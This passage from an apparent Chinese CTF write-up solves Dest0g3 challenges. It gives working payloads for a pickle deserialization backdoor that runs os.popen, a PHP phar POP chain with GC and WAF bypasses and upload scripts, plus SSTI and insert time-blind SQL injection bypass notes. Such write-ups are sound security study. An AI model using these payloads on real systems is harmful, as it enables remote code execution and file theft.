<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>(e=a)|join|count <span class="comment">#1</span></span><br><span class="line"><span class="built_in">dict</span>(ee=a)|join|count <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>学习网址：<a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)</a></p>
<h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><p>Python Pickle反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>) //提交方式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data)) //base64解密</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span> //可以直接调用</span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>限定了只能反序列化<code>config</code>类，而且调用的方法或属性中不能含有<code>__</code></p>
<p>不过题目给了个后门函数，反序列化直接调用即可，命令执行还有回显太贴心了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config_backdoor = GLOBAL(&#x27;config&#x27;, &#x27;backdoor&#x27;)</span><br><span class="line">config_backdoor([&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;])</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python pker.py &lt; 1.txt</span><br><span class="line">b&quot;cconfig\nbackdoor\np0\n0g0\n((S&#x27;__import__(\\&#x27;os\\&#x27;).popen(\\&#x27;cat /flag.txt\\&#x27;).read()&#x27;\nltR.&quot;</span><br><span class="line">b&#x27;Y2NvbmZpZwpiYWNrZG9vcgpwMAowZzAKKChTJ19faW1wb3J0X18oXCdvc1wnKS5wb3BlbihcJ2NhdCAvZmxhZy50eHRcJykucmVhZCgpJwpsdFIu&#x27;</span><br><span class="line">得到flag</span><br><span class="line">Dest0g3&#123;8e176064-cffa-4b03-ba37-387fe945efdc&#125; </span><br><span class="line">ls得到app.py config </span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/image-20220530220227446.png" alt="image-20220530220227446"></p>
<h4 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h4><h5 id="纯纯复现，对其中的内容完全不理解，希望通过以后的学习，能够看懂。"><a href="#纯纯复现，对其中的内容完全不理解，希望通过以后的学习，能够看懂。" class="headerlink" title="纯纯复现，对其中的内容完全不理解，希望通过以后的学习，能够看懂。"></a>纯纯复现，对其中的内容完全不理解，希望通过以后的学习，能够看懂。</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="keyword">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            waf(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.md5(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            waf(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = file_get_contents(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = unserialize(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);<span class="comment">#主要是有个throw new Error(&quot;start&quot;);要绕过，不然__destruct()无法触发，链子开头就废了，利用强行GC（ 垃圾处理机制）来触发__destruct方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught <span class="built_in">Error</span>: start in /<span class="keyword">var</span>/www/html/index.php:<span class="number">80</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 80</span></span><br></pre></td></tr></table></figure>

<p>题目很明显是要先post参数1去调用D类里的file_put_content，然后写入我们的phar文件，再通过file_get_content去访问phar文件来实现反序列化，从air类里的<code>echo new $p($value);</code>也能看出这里要用原生类来读目录和文件。</p>
<p>链子很简单，就不说了。这里主要的难度是绕过最后的<code>throw new Error(&quot;start&quot;);</code>语句，如果想利用destruct方法反序列化会因为最后的抛出错误的语句导致程序提前结束，所以这里要利用unset来绕过最后的错误，让反序列化成功进行</p>
<p>链子末端是个new一个类，打原生类就行，用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件</p>
<p>在 PHP 中，没有任何变量指向这个对象时，这个对象就成为垃圾。PHP 会将其在内存中销毁；这是 PHP 的 GC 垃圾处理机制，防止内存溢出。<br>当一个 PHP 线程结束时，当前占用的所有内存空间都会被销毁，当前程序中所有对象同时被销毁。GC 进程一般都跟着每起一个 SESSION 而开始运行的.gc 目的是为了在 session 文件过期以后自动销毁删除这些文件.</p>
<p>所以构造</p>
<p>post 1：a:2:{i:0;O:4:”tree”:0:{}i:0;i:0;} <em>//或者</em> a:2:{i:0;O:4:”tree”:{}i:0;N;}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> tree;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> apple;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> air;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> tree;</span><br><span class="line"><span class="comment">// $d-&gt;act=&#x27;FilesystemIterator&#x27;;</span></span><br><span class="line"><span class="comment">// $c-&gt;p = $d; </span></span><br><span class="line"><span class="comment">// $b-&gt;xxx = $c;</span></span><br><span class="line"><span class="comment">// $b-&gt;flag = &#x27;glob:///*f*&#x27;; //读取文件名，使用的，构造方式是使用反序列化链</span></span><br><span class="line"><span class="comment">// $a-&gt;name = $b;</span></span><br><span class="line"><span class="variable">$d</span>-&gt;act=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>; </span><br><span class="line"><span class="variable">$b</span>-&gt;xxx = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;flag = <span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件,随便新建一个文件内容随意</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="comment">//O:4:&quot;tree&quot;:2:&#123;s:4:&quot;name&quot;;O:5:&quot;apple&quot;:2:&#123;s:3:&quot;xxx&quot;;O:3:&quot;air&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;tree&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;act&quot;;s:13:&quot;SplFileObject&quot;;&#125;&#125;s:4:&quot;flag&quot;;s:8:&quot;/fflaggg&quot;;&#125;s:3:&quot;act&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>生成phar文件之后在010里进行修改（这是读文件的phar，读目录的时候忘了截图被覆盖了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">?             ?  a:2:&#123;i:0;O:4:&quot;tree&quot;:2:&#123;s:4:&quot;name&quot;;O:5:&quot;apple&quot;:2:&#123;s:3:&quot;xxx&quot;;O:3:&quot;air&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;tree&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;act&quot;;s:13:&quot;SplFileObject&quot;;&#125;&#125;s:4:&quot;flag&quot;;s:8:&quot;/fflaggg&quot;;&#125;s:3:&quot;act&quot;;N;&#125;   test.txt   Ｑ攂   ~囟      testk鬕P疷y?毇蜑^VT   GBMB</span><br></pre></td></tr></table></figure>

<p>然后修改签名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://04145308-c7af-4516-9ab4-c38864e26c72.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;&#x27;</span>,</span><br><span class="line">        <span class="number">0</span>: <span class="built_in">open</span>(<span class="string">&#x27;./reaflag2.phar.gz&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">) <span class="comment"># 写入</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>达到调用unset的目的</p>
<p>然后要绕过代码中的waf，可以对phar文件进行压缩，gzip fixd reaflag2.phar</p>
<p>还有一个坑点就是，文件上传容易有编码会变，要urlencode一下</p>
<p>再利用python脚本上传文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fixd_phar.phar.gz&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ff=f.read()</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">rep = requests.post(url=<span class="string">&quot;http://f4d5f70c-40fd-4d98-b794-3172f01132fb.node4.buuoj.cn:81/&quot;</span>, data=<span class="string">&#x27;1=a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#125;i:0;i:0;&#125;&amp;0=&#x27;</span>+quote(ff), headers=headers)</span><br><span class="line"><span class="built_in">print</span>(rep.text)</span><br><span class="line">得到</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;?&amp;gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;/tmp/7000b51030043a634697ec7522e499d3.jpg&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: start <span class="keyword">in</span> /var/www/html/index.php:<span class="number">80</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line">  thrown <span class="keyword">in</span> &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;<span class="number">80</span>&lt;/b&gt;&lt;br /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到上传地址之后利用phar协议访问一下就行。</p>
<p>post提交</p>
<p>1=a:2:{i:0;O:1:”D”:1:{s:5:”start”;s:1:”r”;}i:0;i:0;}&amp;0=phar:////tmp/7000b51030043a634697ec7522e499d3.jpg</p>
<p>即可获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dest0g3&#123;9dae309e-461e-4032-8850-838145e8764f&#125; </span><br></pre></td></tr></table></figure>

<p>学习网址：[(10条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120797688">phar反序列化][NSSCTF]prize_p1_Snakin_ya的博客-CSDN博客</a></p>
<p>然后要绕过代码中的waf，可以对phar文件进行压缩，原理可以看这个<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240007#h2-5">从一道题再看phar的利用 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h3 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h3><p>insert 注入</p>
<p>就一个登录界面 输入啥都没反应 查看源码 说是一个钓鱼网站 那应该就是insert注入 纯记录的 布尔盲注不行了 时间盲注即可</p>
<p>给了黑名单，用<code>benchmark(2999999,md5(&#39;test&#39;))</code>代替sleep 时间盲注直接梭 空格用 %0a 或者括号包裹代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;updatexml&#x27;</span>,<span class="string">&#x27;order&#x27;</span>,<span class="string">&#x27;by&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;extractvalue&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;alter&#x27;</span>,<span class="string">&#x27;handler&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;offset&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;case&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;load&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>网上找的脚本</p>
